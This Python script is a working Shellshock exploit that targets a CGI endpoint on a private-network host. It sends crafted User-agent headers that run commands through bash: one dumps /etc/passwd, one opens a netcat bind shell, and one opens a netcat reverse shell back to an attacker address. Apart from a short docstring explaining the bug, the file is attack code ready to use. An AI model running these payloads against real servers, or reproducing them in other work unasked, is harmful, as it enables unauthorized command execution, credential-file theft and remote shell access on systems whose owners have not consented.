import socket

'''
bash keeps evaluating environment var after env functions
ex:
    var() {ignored;}; echo "hello World"
This will echo "hello World"
To fix shellshock you will need to update current bash
'''

class shellshock():
    def __init__(self,host,port,url):
        self.host = host
        self.port = port
        self.url = url

    def send(self,payload):
        sock = socket.socket()
        sock.connect((self.host,self.port))
        headers = "GET " + self.url + " HTTP/1.1\r\nHost: " + self.host + "\r\n"
        headers2 = "Content-length: 0\r\n\r\n"
        sock.send(headers+payload+headers2)
        result = sock.recv(10000)
        while (len(result) > 0):
            print(result)
            result = sock.recv(10000)

    def getPasswd(self):
        get_pass_payload = "User-agent: () { :; }; echo; /bin/bash -c 'cat /etc/passwd';"
        self.send(get_pass_payload)

    def bindShell(self,port=9999):
        bind_shell_payload = "User-agent: () { :; }; echo; /bin/bash -c 'nc -l -p %d -e /bin/sh';"%(port)
        self.send(bind_shell_payload)

    def reverseShell(self,address,port):
        reverse_shell_payload = "User-agent: () { :; }; echo; /bin/bash -c 'nc %s %d -e\
        /bin/sh';"%(address,port)
        self.send(reverse_shell_payload)


if __name__ == '__main__':
    HOST = '172.16.230.167'
    PORT = 80
    url = '/cgi-bin/status'
    s = shellshock(HOST,PORT,url)
    s.getPasswd()
    #s.bindShell(port=9999)
    #s.reverseShell(address="172.16.230.166",port=443)
